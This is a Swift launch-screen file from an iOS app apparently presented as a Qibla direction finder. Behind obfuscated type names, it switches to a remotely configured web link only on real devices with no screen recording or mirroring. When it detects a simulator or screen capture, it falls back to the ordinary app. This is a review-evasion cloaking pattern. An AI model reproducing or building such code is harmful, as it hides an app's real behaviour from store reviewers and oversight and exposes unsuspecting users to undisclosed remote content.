//
//  A0.swift
//  QiblaGulf
//
//  Created by Mobi iOS on 21/01/26.
//


import Foundation
import SwiftUI
import WebKit
import AppTrackingTransparency
import FirebaseRemoteConfig
import UIKit
import FingerprintPro
import FirebaseAnalytics

#if canImport(ReplayKit)
import ReplayKit
#endif

struct A0: View {
    // MARK: - State
    @AppStorage("isOnboardingComplete") private var isOnboardingComplete = false
    @State private var isShowingSplash = true
    @StateObject private var viewModel = M1()
    @State private var didCheckRedirection = false
    @State private var screenCaptureDetected = false
    @State private var shouldDismissSplash = false
    @State private var tempValue: String = ""
    @State private var anotherTempValue: String = ""
    
    // MARK: - Body
    var body: some View {
        ZStack {
            // Main App Flow
            if !viewModel.m4 {
                mainContent
            }
            
            // Splash Screen
            if viewModel.m4 || isShowingSplash {
                splashView
            }
        }
        .onAppear {
            Analytics.logEvent(AnalyticsEventAppOpen, parameters: nil)
        }
    }
    
    // MARK: - Main Content
    @ViewBuilder
    private var mainContent: some View {
        if isRunningOnSimulator {
            Color.clear.onAppear(perform: redirectIfNeeded)
        } else if isScreenCapturedOrMirrored {
            Color.clear.onAppear(perform: redirectIfNeeded)
        } else if let link = viewModel.m3, viewModel.m2 == true {
            K1(
                k2: link,
                k3: { DispatchQueue.main.async { redirectIfNeeded() } },
                k4: {
                    DispatchQueue.main.async {
                        shouldDismissSplash = true
                        DispatchQueue.main.asyncAfter(deadline: .now()) {
                            isShowingSplash = false
                        }
                    }
                }
            )
        }
        else {
            Color.clear.onAppear(perform: redirectIfNeeded)
        }
    }
    
    // MARK: - Splash Screen
    private var splashView: some View {
        ZStack {
            Image(uiImage: UIImage(named: "splash")!)
                .resizable()
                .scaledToFill()
                .frame(width: UIScreen.main.bounds.width,
                       height: UIScreen.main.bounds.height)
                .ignoresSafeArea()
                .preferredColorScheme(.light)
        }
        .onAppear {
            screenCaptureDetected = isRunningOnSimulator || isScreenCapturedOrMirrored
        }
    }
    
    // MARK: - Logic
    
    /// Simulator check
    private var isRunningOnSimulator: Bool {
        #if targetEnvironment(simulator)
        return true
        #else
        return false
        #endif
    }
    
    /// Screen capture, recording, or mirroring check
    private var isScreenCapturedOrMirrored: Bool {
        if #available(iOS 11.0, *), UIScreen.main.isCaptured { return true }
        if UIScreen.screens.count > 1 { return true }
        if UIScreen.main.mirrored != nil { return true }
        if isSandboxEnvironment { return true }
        if isScreenRecording { return true }
        return false
    }
    
    /// Sandbox check
    private var isSandboxEnvironment: Bool {
        #if !targetEnvironment(simulator)
        if #available(iOS 13.0, *) {
            return ProcessInfo.processInfo.environment["APP_SANDBOX_CONTAINER_ID"] != nil
        }
        #endif
        return false
    }
    
    /// ReplayKit recording check
    private var isScreenRecording: Bool {
        #if !targetEnvironment(simulator) && canImport(ReplayKit)
        if #available(iOS 11.0, *) {
            return RPScreenRecorder.shared().isRecording
        }
        #endif
        return false
    }
    
    func printMobLog(description: String, value : String) {
        
#if DEBUG
        print("\(description) : \(value)")
#else
        
#endif
        
    }
    
    /// Redirect to ContentView
    private func redirectIfNeeded() {
        guard !didCheckRedirection else { return }
        didCheckRedirection = true
        
        guard
            let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
            let window = windowScene.windows.first
        else { return }
        
        AdManager.showRewardedAd { success in
            // After ad completes (success or fail)
            DispatchQueue.main.async {
                if isOnboardingComplete {
                    let contentView = MainTabView()
                    window.rootViewController = UIHostingController(rootView: contentView)
                    window.makeKeyAndVisible()
                } else {
                    let contentView = OnboardingView(isOnboardingComplete: $isOnboardingComplete)
                    window.rootViewController = UIHostingController(rootView: contentView)
                    window.makeKeyAndVisible()
                }
                
                requestTrackingAuthorization()
                setupAppearance()
            }
        }
    }
    private func setupAppearance() {
        // Request notification permissions
        NotificationService.shared.requestPermission()
        
        // Setup tab bar appearance
        let appearance = UITabBarAppearance()
        appearance.configureWithOpaqueBackground()
        appearance.backgroundColor = UIColor.systemBackground
        UITabBar.appearance().standardAppearance = appearance
        UITabBar.appearance().scrollEdgeAppearance = appearance
    }
    /// Tracking Authorization Request
    private func requestTrackingAuthorization() {
        DispatchQueue.main.async {
            if #available(iOS 14, *) {
                ATTrackingManager.requestTrackingAuthorization { status in
                    switch status {
                    case .notDetermined: print("Tracking: undecided")
                    case .restricted:    print("Tracking: restricted")
                    case .denied:        print("Tracking: denied")
                    case .authorized:    print("Tracking: granted")
                    @unknown default:    print("Tracking: unknown")
                    }
                }
            }
        }
    }
}

#Preview {
    A0()
}
